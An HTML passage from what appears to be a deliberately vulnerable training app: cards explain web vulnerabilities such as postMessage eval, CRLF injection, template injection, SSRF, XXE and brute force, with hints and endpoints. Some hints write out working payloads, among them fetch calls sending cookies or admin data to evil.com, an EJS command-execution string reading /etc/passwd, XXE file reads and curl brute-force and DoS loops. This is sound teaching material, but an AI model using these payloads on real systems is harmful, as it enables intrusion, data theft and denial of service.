                    window.postMessage() lets different browser windows/tabs communicate across origins. Pages use addEventListener('message') to receive messages. The DANGER: if the listener doesn't check message.origin and blindly executes message.data, attackers can send malicious code from ANY website! Example: page does eval(event.data) ‚Äî attacker sends "fetch('/api/admin').then(r=>r.json()).then(d=>fetch('http://evil.com?'+JSON.stringify(d)))"
                </div>
                <div class="hint-box">
                    Vulnerable code: window.addEventListener('message', (e) => eval(e.data)). ANY website can: window.open('target.com').postMessage('alert(document.cookie)', '*'). The * means send to any origin! Proper code checks: if (e.origin !== 'https://trusted.com') return;
                </div>
                <div class="challenge-box">
                    Can you exploit /api/postmessage by sending malicious postMessage? Create a page that sends JavaScript code to the target. What can you execute? Can you steal cookies or call authenticated APIs?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/postmessage</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Attacker page: window.opener.postMessage('alert(1)', '*')</p>
                    <p>‚Ä¢ Or: targetWindow.postMessage('fetch("http://evil.com?c="+document.cookie)', '*')</p>
                    <p>‚Ä¢ Check if page validates: event.origin === 'https://trusted.com'</p>
                    <p>‚Ä¢ If no origin check, you can send from anywhere</p>
                    <p>‚Ä¢ Real impact: full XSS, steal tokens, perform actions as user</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity medium">MEDIUM</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üì°</span>
                    <h2 class="vuln-title">WebRTC IP Leak</h2>
                </div>
                <div class="vuln-description">
                    WebRTC enables video/voice calls in browsers by connecting peers directly. To establish connections, browsers reveal ALL network interfaces ‚Äî including your REAL private IP (192.168.x.x) even when using VPN/Proxy! JavaScript can access this via RTCPeerConnection without permissions. Attackers use this to identify users behind anonymity tools and map internal networks.
                </div>
                <div class="hint-box">
                    WebRTC uses STUN servers to discover your IPs. Code: new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]}) reveals local IPs in ICE candidates. Even if you're behind VPN showing public IP 1.2.3.4, WebRTC leaks your real LAN IP 192.168.1.100!
                </div>
                <div class="challenge-box">
                    Can you discover the real IP addresses using /api/webrtc-config? Create JavaScript that establishes a WebRTC connection and logs all ICE candidates. What local IPs are revealed? How does this bypass VPN protection?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/webrtc-config</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Code: let pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]})</p>
                    <p>‚Ä¢ pc.onicecandidate = (e) => console.log(e.candidate.address)</p>
                    <p>‚Ä¢ Creates data channel to trigger ICE gathering: pc.createDataChannel('')</p>
                    <p>‚Ä¢ ICE candidates contain: 192.168.x.x, 10.x.x.x, real public IP</p>
                    <p>‚Ä¢ Impact: deanonymize VPN users, fingerprint internal network</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">‚Ü©Ô∏è</span>
                    <h2 class="vuln-title">CRLF Injection</h2>
                </div>
                <div class="vuln-description">
                    HTTP responses separate headers from body using \r\n\r\n (Carriage Return Line Feed). If user input goes into a header without validation, attackers inject %0d%0a (URL-encoded \r\n) to INSERT NEW HEADERS or even write RESPONSE BODY! Example: inject Set-Cookie: admin=true or Location: http://evil.com to set cookies or redirect. This is HTTP Response Splitting.
                </div>
                <div class="hint-box">
                    Server code: res.setHeader('X-Custom', req.query.value) without sanitizing. Attacker sends: ?value=test%0d%0aSet-Cookie:admin=true ‚Üí response becomes: X-Custom: test\r\nSet-Cookie:admin=true. Now you've injected a cookie! Double CRLF (%0d%0a%0d%0a) lets you inject response body for XSS!
                </div>
                <div class="challenge-box">
                    Can you inject headers into /api/header-inject? Try adding %0d%0aSet-Cookie:admin=true or %0d%0aLocation:http://evil.com. What headers can you inject? Can you cause cache poisoning or XSS?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/header-inject</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Inject: value=%0d%0aSet-Cookie:admin=true;%20path=/</p>
                    <p>‚Ä¢ Inject: value=%0d%0aLocation:http://attacker.com</p>
                    <p>‚Ä¢ Inject body: value=%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;</p>
                    <p>‚Ä¢ URL encode: \r = %0d, \n = %0a</p>
                    <p>‚Ä¢ Impact: set arbitrary cookies, redirect users, cache poison, XSS</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üé®</span>
                    <h2 class="vuln-title">Template Injection (Multiple)</h2>
                </div>
                <div class="vuln-description">
                    Template engines (EJS, Handlebars, Jinja2, XSLT) turn templates into HTML. They have special syntax like <%= code %> or {{ expression }} that EXECUTES on the server! If user input goes directly into templates without escaping, attackers inject template code for Remote Code Execution. Different from XSS because it runs on the SERVER, not browser!
                </div>
                <div class="hint-box">
                    Vulnerable: res.render('page', {name: req.query.name}) where template has &lt;%= name %&gt;. Attacker sends: ?name=&lt;%=process.mainModule.require('child_process').execSync('whoami')%&gt; to run shell commands! Each engine has unique syntax for RCE.
                </div>
                <div class="challenge-box">
                    Can you achieve RCE via template injection? /api/render-template uses EJS, /api/template uses Handlebars, /api/xslt uses XSLT. Research each engine's exploit syntax. Can you read files? Execute commands?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/render-template</span>
                <span class="endpoint-badge">GET /api/template</span>
                <span class="endpoint-badge">POST /api/xslt</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ EJS: &lt;%=process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()%&gt;</p>
                    <p>‚Ä¢ Handlebars: {{#with "s" as |string|}}{{#with "e"}}{{lookup string.sub "constructor"}}{{/with}}{{/with}}</p>
                    <p>‚Ä¢ XSLT: &lt;xsl:value-of select="system-property('xsl:version')"/&gt; for info</p>
                    <p>‚Ä¢ Test: inject {{ 7*7 }} or <%= 7*7 %>, if output is 49 = vulnerable</p>
                    <p>‚Ä¢ Impact: full server RCE, read any file, reverse shell</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üîê</span>
                    <h2 class="vuln-title">Session Puzzling</h2>
                </div>
                <div class="vuln-description">
                    Web apps might accept session identifiers from MULTIPLE sources: cookies, URL query strings (?session=abc), HTTP headers (X-Session-ID), POST body. If the server checks multiple sources without proper priority, attackers can confuse it by sending DIFFERENT session IDs in different places! This creates authentication state confusion and privilege escalation.
                </div>
                <div class="hint-box">
                    Code like: let session = req.cookies.session || req.query.session || req.headers['x-session-id'] creates ambiguity. Send cookie with guest session + query parameter with admin session. Some middleware checks cookie (guest), other checks query (admin) ‚Üí confused privilege escalation!
                </div>
                <div class="challenge-box">
                    Can you confuse /api/multi-session by sending different session IDs in cookie vs query string? Try: Cookie: session=guest123 while also adding ?session=admin456. Which one does the auth check? Which one grants access? Can you mix and match to gain admin?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/multi-session</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Send: Cookie: session=your_normal_session AND ?session=stolen_admin_session</p>
                    <p>‚Ä¢ Or: Cookie: session=guest AND X-Session-ID: admin_session_token</p>
                    <p>‚Ä¢ Try combinations: auth checks cookie but data fetch checks query param</p>
                    <p>‚Ä¢ Session fixation + puzzling: force victim to use your session ID</p>
                    <p>‚Ä¢ Impact: privilege escalation, access other user data, bypass auth</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üîë</span>
                    <h2 class="vuln-title">API Keys in URLs</h2>
                </div>
                <div class="vuln-description">
                    API keys in URL query parameters (?apiKey=secret123) get logged EVERYWHERE: browser history, server logs, proxy logs, referrer headers when clicking external links, analytics tools, browser extensions. It's like writing your password on a postcard! Once in logs, keys remain forever. Anyone with log access (admins, attackers, third parties) can steal them.
                </div>
                <div class="hint-box">
                    GET /api/data?apiKey=sk_live_abc123 ‚Üí logged in: Chrome history, nginx access.log, Cloudflare logs, Google Analytics, error tracking tools. If you visit external site, Referer header leaks full URL with key! Proper way: use Authorization header or POST body.
                </div>
                <div class="challenge-box">
                    Can you find API keys in URL parameters on /api/data? Check your browser history after making requests. What other places might these keys leak to? How would you exploit leaked keys from referrer headers?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/data</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Check: chrome://history - see full URLs with keys</p>
                    <p>‚Ä¢ Server logs: tail -f /var/log/nginx/access.log shows ?apiKey=</p>
                    <p>‚Ä¢ Referer leak: page with ?apiKey=X links to external.com ‚Üí external.com sees full URL in Referer</p>
                    <p>‚Ä¢ Third-party scripts: analytics, error tracking see full URL</p>
                    <p>‚Ä¢ Fix: use Authorization: Bearer token or POST body with key</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity medium">MEDIUM</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üí•</span>
                    <h2 class="vuln-title">Billion Laughs / XML Bomb</h2>
                </div>
                <div class="vuln-description">
                    XML supports entities (variables): &amp;lol1; = "lol". You can nest them: &amp;lol2; = "&amp;lol1;&amp;lol1;" (2 lols), &amp;lol3; = "&amp;lol2;&amp;lol2;" (4 lols), continuing to &amp;lol9; = billions of "lol"s! When XML parser expands these, it uses EXPONENTIAL memory. A tiny 1KB XML becomes 3GB in memory, crashing the server. This is a Denial of Service attack!
                </div>
                <div class="hint-box">
                    Attack XML: &lt;!ENTITY lol1 "lol"&gt; &lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;"&gt; ... &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;"&gt; then use &amp;lol9;. Parser expands: 2^9 = 512 lol1s. With 9 levels of 10 entities each = 10^9 (billion) expansions! Server runs out of RAM.
                </div>
                <div class="challenge-box">
                    Can you crash /api/xml-parse with a billion laughs attack? Create XML with nested entities that expand exponentially. How many levels before the server becomes unresponsive? How small can you make the payload?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/xml-parse</span>
                <span class="endpoint-badge">POST /api/xml-blind</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ XML payload: &lt;!DOCTYPE data [&lt;!ENTITY lol0 "lol"&gt;&lt;!ENTITY lol1 "&amp;lol0;&amp;lol0;&amp;lol0;..."&gt;...]&gt;</p>
                    <p>‚Ä¢ Each level multiplies by 10, 9 levels = billion expansions</p>
                    <p>‚Ä¢ Final reference: &lt;data&gt;&amp;lol9;&lt;/data&gt;</p>
                    <p>‚Ä¢ Payload size: ~1KB, memory usage: 3GB+</p>
                    <p>‚Ä¢ Defense: disable entity expansion, set expansion limits</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity medium">MEDIUM</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üî¢</span>
                    <h2 class="vuln-title">Integer Overflow</h2>
                </div>
                <div class="vuln-description">
                    Integers have maximum values. In 32-bit systems: 2,147,483,647 is max. Add 1 and it WRAPS AROUND to -2,147,483,648! This is integer overflow. In web apps: transfer $1 when balance calculation overflows, you might get $2 billion! Or buy items with quantity -1 (wraps to huge positive) for negative price (gaining money instead of spending).
                </div>
                <div class="hint-box">
                    Vulnerable code: balance = balance + amount without checking overflow. Send amount = INT_MAX, balance wraps to negative! Or: totalPrice = quantity * price without validation. Send quantity = 2147483647, price = 2 = overflow = negative/zero price!
                </div>
                <div class="challenge-box">
                    Can you cause integer overflow in /api/calculate? Try sending very large numbers like 2147483647. What happens when you add to this? Can you make totalPrice become negative? How could you get free items?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/calculate</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Try: quantity = 2147483647 (INT_MAX), price = 2</p>
                    <p>‚Ä¢ Result: 2147483647 * 2 = overflow = negative or very small</p>
                    <p>‚Ä¢ Try: balance = 2147483647, add 1 = wraps to -2147483648</p>
                    <p>‚Ä¢ JavaScript: numbers are 64-bit floats, but server might use 32-bit</p>
                    <p>‚Ä¢ Real impact: free purchases, balance manipulation, bypass limits</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">‚ö†Ô∏è</span>
                    <h2 class="vuln-title">No Rate Limiting</h2>
                </div>
                <div class="vuln-description">
                    Rate limiting restricts how many requests a user can make (e.g., 100 requests per minute). Without it, attackers can send UNLIMITED requests! This enables: brute force attacks (try all PINs 0000-9999 in seconds), credential stuffing (test leaked password lists), DoS (overwhelm server), scraping entire databases. It's like a bank with no daily withdrawal limit.
                </div>
                <div class="hint-box">
                    No rate limit means: write script to test every possible password, iterate through all user IDs, overwhelm server with requests. Example: 4-digit PIN = 10,000 attempts. At 100 requests/second = cracked in 100 seconds! Proper apps limit to 5 attempts before lockout.
                </div>
                <div class="challenge-box">
                    Can you brute force /api/brute-force-endpoint? Write a script to test all 4-digit PINs (0000-9999). How fast can you iterate? What other endpoints have no rate limiting? Can you enumerate all users?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/brute-force-endpoint</span>
                <span class="endpoint-badge">ALL ENDPOINTS</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Script: for i in {0000..9999}; do curl -X POST /api/login -d "pin=$i"; done</p>
                    <p>‚Ä¢ Use tools: hydra, burp intruder, custom Python script</p>
                    <p>‚Ä¢ Test user enumeration: /api/user/1, /api/user/2, ... /api/user/10000</p>
                    <p>‚Ä¢ DoS: while true; do curl /api/heavy-endpoint; done (overwhelm server)</p>
                    <p>‚Ä¢ Impact: account takeover, data scraping, DoS, password cracking</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üîì</span>
                    <h2 class="vuln-title">Weak Password Policy</h2>
                </div>
                <div class="vuln-description">
                    Password strength is critical! Without enforcement, users choose: "123456", "password", "admin", "abc", even single letter "a"! These are instantly crackable with dictionary attacks or brute force. A proper policy requires: minimum 8 characters, mix of uppercase/lowercase/numbers/symbols, reject common passwords. No policy = every account is vulnerable.
                </div>
                <div class="hint-box">
                    Vulnerable apps accept any string as password. Check database: SELECT password FROM users ‚Üí see "admin", "123456", "password", "a". Attackers use lists of most common passwords (rockyou.txt has 14 million). Without policy, 10-30% of accounts use top 100 passwords!
                </div>
                <div class="challenge-box">
                    Can you register accounts with weak passwords on /api/register? Try "a", "123", "admin". What's the minimum length accepted? Can you see other users' weak passwords? How would you exploit this with a dictionary attack?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/register</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Test registration: password="a" - if accepted, no policy</p>
                    <p>‚Ä¢ Common passwords list: admin, password, 123456, qwerty, welcome</p>
                    <p>‚Ä¢ Tools: hashcat, john the ripper with rockyou.txt wordlist</p>
                    <p>‚Ä¢ Check database for weak hashes: md5, sha1 without salt</p>
                    <p>‚Ä¢ Impact: mass account compromise via dictionary/brute force</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity medium">MEDIUM</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üåÄ</span>
                    <h2 class="vuln-title">Unicode Normalization Bypass</h2>
                </div>
                <div class="vuln-description">
                    Unicode has multiple ways to represent the SAME character! Example: "√©" can be: single character √© (U+00E9) OR letter e + combining accent (U+0065 + U+0301). These look identical but are different bytes! Filters checking for "script" won't catch "ùï§ùïîùï£ùïöùï°ùï•" (mathematical bold). This bypasses blocklists, XSS filters, and SQL injection protections.
                </div>
                <div class="hint-box">
                    Normalization converts variants to standard form. If filter checks BEFORE normalization but app uses AFTER: bypass! Example: blocklist checks for "<script>", you send "<ùï§ùïîùï£ùïöùï°ùï•>", it normalizes to "<script>" after check. Also: null bytes U+0000, zero-width spaces, RTL overrides.
                </div>
                <div class="challenge-box">
                    Can you bypass filters on /api/normalize using Unicode tricks? Try sending blocked keywords in different Unicode representations. What about "admin" (Latin fullwidth) instead of "admin"? How does the server normalize input?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/normalize</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Try: ùï§ùïîùï£ùïöùï°ùï• (math bold) instead of "script"</p>
                    <p>‚Ä¢ Try: eÃÅ (e + combining accent) instead of √©</p>
                    <p>‚Ä¢ Try: ÔΩÅÔΩÑÔΩçÔΩâÔΩé (fullwidth) instead of "admin"</p>
                    <p>‚Ä¢ Check: tool converts your input, compare before/after</p>
                    <p>‚Ä¢ Impact: bypass WAF, XSS filters, SQL blocklists, authentication</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity medium">MEDIUM</span>
                <div class="vuln-header">
                    <span class="vuln-icon">‚ö°</span>
                    <h2 class="vuln-title">Server-Side Includes (SSI)</h2>
                </div>
                <div class="vuln-description">
                    SSI is an old server technology that processes HTML COMMENTS with special directives. When server sees special comment, it EXECUTES commands! This is like server-side template injection but using HTML comment syntax. Attackers inject SSI directives to include files, execute commands, or leak environment variables.
                </div>
                <div class="hint-box">
                    SSI syntax uses HTML comments with # directives. Common payloads: include file to read files, exec cmd to run shell commands, echo var to leak environment variables. Vulnerable if server processes .shtml or has SSI enabled.
                </div>
                <div class="challenge-box">
                    Can you exploit /api/ssi with Server-Side Includes? Try injecting SSI directives in your input. Can you include files? Execute commands? What sensitive data can you access?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/ssi</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Test detection: send comment with # and check if processed</p>
                    <p>‚Ä¢ Try different encodings to bypass filters</p>
                    <p>‚Ä¢ Check response for: [an error occurred while processing this directive]</p>
                    <p>‚Ä¢ Works on: Apache with mod_include, IIS with SSI enabled</p>
                    <p>‚Ä¢ Impact: RCE, file disclosure, environment variable leak</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity low">LOW</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üåê</span>
                    <h2 class="vuln-title">DNS Rebinding</h2>
                </div>
                <div class="vuln-description">
                    DNS rebinding exploits how browsers cache DNS lookups. Attacker controls a domain that FIRST resolves to public IP (passes SSRF checks), then CHANGES to internal IP (127.0.0.1 or 192.168.x.x) seconds later! Browser's same-origin policy thinks it's still the same domain, allowing access to internal services that were supposedly blocked.
                </div>
                <div class="hint-box">
                    Attack flow: Server checks attacker.com ‚Üí resolves to 1.2.3.4 (public IP, allowed). Server makes request. Meanwhile, attacker changes DNS: attacker.com now = 127.0.0.1. Browser cache expires, new request goes to localhost! This bypasses "no internal IPs" filters because DNS check was done earlier.
                </div>
                <div class="challenge-box">
                    Can you use DNS rebinding to access internal services on /api/internal-network? You'll need control of a domain with very low TTL. How would you exploit this to access localhost:6379 (Redis) or other internal services?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/internal-network</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Setup: register domain, set DNS TTL = 0 (no caching)</p>
                    <p>‚Ä¢ First response: A record = your public IP (pass SSRF check)</p>
                    <p>‚Ä¢ After delay: change A record to 127.0.0.1 or 192.168.1.1</p>
                    <p>‚Ä¢ Tools: singularity, whonow (DNS rebinding frameworks)</p>
                    <p>‚Ä¢ Impact: access internal services, bypass SSRF protections</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity medium">MEDIUM</span>
                <div class="vuln-header">
                    <span class="vuln-icon">‚Ü™Ô∏è</span>
                    <h2 class="vuln-title">SSRF via Redirect</h2>
                </div>
                <div class="vuln-description">
                    Servers follow HTTP redirects automatically. SSRF filters might check the INITIAL URL (https://evil.com/redirect) but not the REDIRECT TARGET! Attacker's server responds: "302 Found, Location: http://127.0.0.1:6379". The victim server follows the redirect to internal services, bypassing URL validation that only checked the first hop.
                </div>
                <div class="hint-box">
                    Attack: victim checks evil.com (external, allowed) ‚Üí makes request ‚Üí evil.com returns: HTTP 302, Location: http://localhost:6379/CONFIG%20GET%20* ‚Üí victim follows redirect to internal Redis! Filter only validated first URL, not redirect chain.
                </div>
                <div class="challenge-box">
                    Can you exploit /api/follow-redirect or /api/external-redirect? Setup a server that redirects to internal IPs. What internal services can you reach? Can you chain multiple redirects to bypass deeper filters?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/follow-redirect</span>
                <span class="endpoint-badge">GET /api/external-redirect</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Setup redirect server: app.get('/r', (req,res) => res.redirect('http://127.0.0.1:6379'))</p>
                    <p>‚Ä¢ Or use services: bit.ly, tinyurl with internal IP</p>
                    <p>‚Ä¢ Test: curl -L http://yourserver.com/redirect (follows to internal)</p>
                    <p>‚Ä¢ Chain redirects: evil.com ‚Üí evil2.com ‚Üí 127.0.0.1 (bypass multiple checks)</p>
                    <p>‚Ä¢ Impact: full SSRF, access internal APIs/databases/cloud metadata</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity critical">CRITICAL</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üé¨</span>
                    <h2 class="vuln-title">SVG XSS / XXE</h2>
                </div>
                <div class="vuln-description">
                    SVG files are XML that can contain JavaScript AND external entity references! Unlike JPEG/PNG, SVG is text-based XML. Attackers upload malicious SVG with embedded scripts or XXE payloads. When rendered inline or viewed directly, the JavaScript executes (XSS) or XML entities load files (XXE). This is CRITICAL because image uploads are often trusted!
                </div>
                <div class="hint-box">
                    SVG XSS: &lt;svg&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/svg&gt;. When page displays this SVG inline or with &lt;img&gt; tags (some browsers), script runs! XXE in SVG: &lt;!DOCTYPE svg [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;svg&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt; reads files!
                </div>
                <div class="challenge-box">
                    Can you exploit /api/upload-svg? Create malicious SVG files with XSS payloads or XXE. Try both attacks. Does the server render SVG inline? Can you steal cookies or read server files?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/upload-svg</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ XXE payload: &lt;!DOCTYPE svg [&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;svg&gt;&lt;text&gt;&amp;file;&lt;/text&gt;&lt;/svg&gt;</p>
                    <p>‚Ä¢ Or use: &lt;svg onload="alert(1)"&gt;&lt;/svg&gt;</p>
                    <p>‚Ä¢ Upload as .svg, server might render inline or in &lt;img&gt;</p>
                    <p>‚Ä¢ Some contexts: &lt;object&gt; and &lt;embed&gt; tags execute scripts</p>
                    <p>‚Ä¢ Impact: full XSS (cookie theft), XXE (file read, SSRF)</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity medium">MEDIUM</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üî¢</span>
                    <h2 class="vuln-title">Format String Vulnerabilities</h2>
                </div>
                <div class="vuln-description">
                    Format strings use specifiers like %s (string), %d (decimal), %x (hex), %p (pointer) to format output. In languages like C/C++, using user input directly as format string is CATASTROPHIC: %x reads stack memory, %n WRITES to memory locations! Even in safer languages, format string bugs can leak data or cause crashes through excessive memory reads.
                </div>
                <div class="hint-box">
                    Vulnerable code: printf(user_input) instead of printf("%s", user_input). Attacker sends: "%x %x %x %x" ‚Üí leaks stack memory addresses. Or "%s %s %s" ‚Üí crashes trying to read strings from random addresses. In C: "%n" writes byte count to address on stack = arbitrary memory write!
                </div>
                <div class="challenge-box">
                    Can you exploit /api/format with format string specifiers? Try sending multiple %x to leak memory addresses or %s to cause crashes. What data can you leak? Can you find pointers or sensitive strings in memory?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/format</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Try: %x %x %x %x %x %x %x %x (leak 8 stack values)</p>
                    <p>‚Ä¢ Try: %p %p %p (leak pointers/addresses)</p>
                    <p>‚Ä¢ Try: %s (read string from random address, might crash)</p>
                    <p>‚Ä¢ In C programs: %n writes to memory (RCE potential!)</p>
                    <p>‚Ä¢ Impact: info leak (addresses for ASLR bypass), DoS, sometimes RCE</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity medium">MEDIUM</span>
                <div class="vuln-header">
                    <span class="vuln-icon">‚ö´</span>
                    <h2 class="vuln-title">Null Byte Injection</h2>
                </div>
                <div class="vuln-description">
                    The null byte %00 (character code 0) terminates strings in C/C++ and some other contexts! If a web app built with vulnerable libraries checks "file.jpg" but underlying C code processes up to %00, attacker can bypass file extension validation! Example: upload "shell.php%00.jpg" ‚Üí validation sees ".jpg", but C code sees "shell.php" (stops at %00).
                </div>
                <div class="hint-box">
                    Null byte = \x00 or %00 (URL encoded). Vulnerable: PHP &lt; 5.3 with C libraries, file operations, path manipulation. Upload shell.php%00.jpg ‚Üí passes .jpg filter ‚Üí saved as shell.php! Also works in: file paths (/etc/passwd%00.txt), SQL in old MySQL versions.
                </div>
                <div class="challenge-box">
                    Can you bypass file extension checks on /api/file-read using null bytes? Try requesting shell.php%00.jpg or ../../../etc/passwd%00.txt. Does the validation only check after %00? What files can you access?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/file-read</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Try: /api/file-read?path=secret.txt%00.jpg</p>
                    <p>‚Ä¢ Try: filename=shell.php%00.jpg when uploading</p>
                    <p>‚Ä¢ URL encode: %00, or hex: \x00 in some contexts</p>
                    <p>‚Ä¢ Test: if (filename.endsWith('.jpg')) ‚Üí bypassed by .php%00.jpg</p>
                    <p>‚Ä¢ Impact: upload malicious files, path traversal, extension bypass</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üîç</span>
                    <h2 class="vuln-title">Stack Traces in Production</h2>
                </div>
                <div class="vuln-description">
                    Stack traces are debugging information showing the exact code path that caused an error: file paths, line numbers, function names, variable values, framework versions, dependencies. This is GOLD for attackers! They learn: your entire directory structure, what frameworks/libraries you use (with versions for known exploits), code logic, sensitive variable names. Production apps should NEVER expose stack traces!
                </div>
                <div class="hint-box">
                    Error handlers in dev mode show full traces. Production mistake: leaving error.stack in responses. Attackers trigger errors intentionally (send invalid input) to harvest info. Stack reveals: /home/user/app/src/auth/login.js:245 ‚Üí now attacker knows exact file structure and can target specific vulnerabilities!
                </div>
                <div class="challenge-box">
                    Can you trigger errors on /api/error to see stack traces? Try sending malformed input, invalid types, or accessing non-existent resources. What information is leaked? Can you identify framework versions or file paths?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/error</span>
                <span class="endpoint-badge">GLOBAL ERROR HANDLER</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Trigger errors: send wrong type, access /api/nonexistent, crash with large input</p>
